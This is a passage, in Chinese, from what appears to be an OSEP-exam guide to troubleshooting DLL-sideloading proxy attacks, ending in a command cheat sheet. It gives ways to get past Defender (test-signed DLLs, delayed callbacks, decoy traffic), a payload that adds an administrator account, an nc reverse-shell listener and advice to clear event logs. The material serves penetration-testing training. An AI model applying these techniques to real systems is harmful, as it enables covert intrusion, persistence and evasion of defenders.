2. **该 DLL 实际从 System32 加载（绝对路径/KnownDLLs）** → 旁加载点不成立。备选：ProcMon 重抓，换一个“宿主目录里能被裸名加载”的 DLL；没有就退回别的入口（本包只覆盖 DLL 线）。
3. **架构不匹配**（Proxy 编成 x64、宿主是 x86）→ 用对应 `i686-`/`x86_64-` 前缀重编，`file` 复核。
4. **杀软/Defender 拦截“无签名 DLL 旁加载”**（`EnableSideloading` 防御）→ 先本地查 `Get-MpComputerStatus`/策略；备选：给 Proxy 签测试证书、改载荷触发时机（延迟+诱饵流量）、换载荷形态（只转发不做持久化，shell 落地后用内存手段）。
5. **用户权限太低且宿主非提升运行** → 拿到的是受限用户，按常规提权流程走，别在载荷里硬写管理员操作（OSEP 场景常配一个可提权环境）。

### 考试注意 OPSEC
- 目录里混入诱饵文件、**保留宿主功能**（窗口正常、业务正常），降低“被用户/管理员注意到程序异常”的概率。
- 反连延迟 2–5 秒再起线程，避免“双击即外连”的行为特征；不要在 DllMain 里干重活（加载器锁内阻塞=必崩）。
- 测试多次会留下指纹：同一 VM 反复放同一 DLL 容易被行为引擎聚合；换名字/换延迟再测。
- 结束后清理：`del legit.dll original.dll` + 删 ZIP（宿主若还开着可后删）；避免留下 `Administrators` 组里名字可疑的新用户（考后删除）。
- Defender 的旁加载拦截策略（Microsoft Defender Attack Surface Reduction 规则 “Block executable files from running unless they meet a prevalence, age, or trusted list criteria”）可能点名这类模式，先小范围验证再批量投。

## 3. 场景 12：DLL 已被加载，但程序立即闪退

### 场景回顾
旁加载点本身有效、目标也执行了程序，但程序**一启动就退出**，后续执行拿不到。根因通常不在“载荷是否被查杀”，而在 **Proxy DLL 与宿主之间的契约破坏**：导入解析失败 / DllMain 崩溃 / 调用约定不匹配。

### 前提与假设
- 已确认宿主确实加载了我们的 DLL（ProcMon/`Load Image` 命中，或 Error Reporting 指向我们的模块）。
- 假设“宿主+原 DLL”单独跑是正常的（先在干净 VM 验证原版）。

### 准备（攻击机侧）
1. 事件视图定位崩溃来源（靶机/复刻 VM）：
   - 事件查看器 → Windows 日志 → 应用程序 → 找 Error/`Application Error` 1000，看 **faulting module name**：
     - 是我们的 `legit.dll` → 我们代码/DllMain 的问题；
     - 是宿主或系统 DLL → 未必是我们导致（先跑原版对照）。
   - 若是弹出 “The procedure entry point `X` could not be located in ... `legit.dll`” → **导出缺失**，走第 2 步。
2. 导出缺失排查（最常见）：
   - 宿主到底从我们这要哪些函数：`dumpbin /imports RunHost.exe`，找 `legit.dll` 小节。
   - 我们的 Proxy 实际导出了哪些：`dumpbin /exports legit.dll`（Windows）或 `objdump -p legit.dll`（Kali）。
   - 差集 → 重新生成 `forward.def`（原 DLL 全量导出），**注意仅按序号导出时 `.def` 要带 `@N`**。
3. 调用约定/名字排查：
   - `dumpbin /exports original.dll` 里名字若带修饰（`_Foo@8` / `Foo@8`）说明是 stdcall；手写实现版必须 `__stdcall` 且参数字节数一致（`@8`=两个 4 字节参数）。**用 `.def` 静态转发可完全绕开这类问题**——这是推荐路径。
   - x86 下 cdecl 导出名是 `_Foo`，stdcall 是 `_Foo@N`；混了就“能加载、一调用就炸”。
4. DllMain 崩溃排查：
   - 用 `m04-proxy-dll-sideload.c`（无载荷纯转发）编译替换：不崩 → 问题在载荷初始化代码，不是转发。
   - 再逐步加回载荷：把 DllMain 里的动作移到 `CreateThread` 的线程函数并包 SEH（`__try/__except`），DllMain 里绝不 `LoadLibrary`/`WaitForSingleObject`/做网络 I/O（加载器锁内会死锁或抛异常）。
5. 对照法：把 `original.dll` 复制回原名 `legit.dll`（去掉我们的文件）跑宿主——若仍闪退，问题在宿主环境（缺 VC 运行库等），与本模块无关。

### 执行步骤
1. 复刻 VM 上先跑“原版宿主 + 原版 DLL”确认基线正常。
2. 放“无载荷 Proxy”跑：正常 → 转发正确；闪退 → 回准备节第 2/3 步查导出与调用约定。
3. 无载荷通过后换实弹版（`m04-proxy-dll-newadmin.c`），若闪退 → 载荷触发方式问题：改线程化 + SEH + 延迟，DllMain 只做 `CreateThread`。
4. 用事件视图确认修复：faulting module 不再指向 `legit.dll`；宿主进程存活；载荷生效。

### 用到的脚本
- `m04-proxy-dll-sideload.c`（隔离对照：无载荷纯转发）
- `m04-proxy-dll-newadmin.c`（实弹版，注意其 DllMain 只 `CreateThread`）
- `m04-proxy-dll-cpp.cpp`（.def / 调用约定注释 + 少量函数手写转发的写法示例）
- 工具链：`dumpbin /exports|/imports|/headers`、`objdump -p`、ProcMon、事件查看器。

### 验证
- 宿主进程在任务管理器/`tasklist` 中持续存活超过 30 秒且窗口可用。
- 事件查看器无新的 `legit.dll` faulting 记录。
- 载荷侧验证照场景 11（反连收到 / 管理员组出现新用户）。
- 交叉验证：x64 与 x86 各编一次各测一次，确认打包脚本的架构断言与实际一致。

### 失败分支与备选
1. **导出转发不全、缺某个只在特定代码路径才调用的函数** → 宿主平时正常、点某按钮才崩。备选：无脑全量转发原 DLL（objdump 全表进 `.def`），不要手工挑函数。
2. **原 DLL 导出了数据（变量）而非纯函数** → 导出转发对“数据导出”无效（转发只适用于函数）。备选：该 DLL 不适合做 Proxy，换候选旁加载点；或手写实现并处理该数据符号（少见，先用 ProcMon 确认真实命中）。
3. **只按序号导出（无名字）** → `.def` 里写 `Foo = original.Foo @N` 保序号；宿主按序号导入时我们的导出序号必须一致。
4. **载荷在 DllMain 里一跑就崩、挪线程后仍崩** → 载荷自身问题（如 shellcode 长度/位数写错）：先用无害动作（写文件/弹窗）验证执行路径，再换真实载荷；SEH 包住让宿主不陪葬。
5. **“闪退”其实是杀软把进程杀了** → faulting module 是 `MsMpEng.exe`/行为引擎：回场景 11 失败分支 4，别在 Proxy 转发上浪费时间。

### 考试注意 OPSEC
- **先隔离变量再动手**：无载荷对照版是场景 12 的第一诊断工具，省得在实弹 DLL 上反复试错留下大量样本。
- 事件查看器会记录每次崩溃（含模块路径）——复刻 VM 上随便崩，靶机上尽量减少崩溃次数，崩完立刻清应用日志或换载荷形态。
- DllMain 里阻塞/死锁不只闪退，还可能把宿主卡死被用户注意到；坚持“DllMain 只开线程”原则。
- 手写实现导出时小心修饰名泄漏工具链信息；`.def` 转发路径最干净，最终包优先用它。

## 4. 附录：常用命令速查

```bash
# Kali —— 看宿主/原 DLL 架构
file RunHost.exe original.dll

# Kali —— 导出表（生成 forward.def 的数据源）
x86_64-w64-mingw32-objdump -p original.dll | sed -n '/Export Name Pointer Table/,/Ordinal Hint Table/p'

# Windows —— 导出表 / 宿主导入 / 机器类型
dumpbin /exports original.dll
dumpbin /imports RunHost.exe
dumpbin /headers RunHost.exe | findstr machine

# 打包（校验架构一致性后出 ZIP）
python3 m04-build-sideload-package.py --input-dir ./sideload \
  --dll-name legit.dll --out sideload-pkg.zip

# 监听（反连模式）
nc -lvnp LPORT
```

目录包布局、版本与架构断言、诱饵文件都在 `m04-build-sideload-package.py` 内做最终一致性检查；投递前在复刻 VM 用 ProcMon 再确认一次“Load Image 命中我们的 legit.dll”。
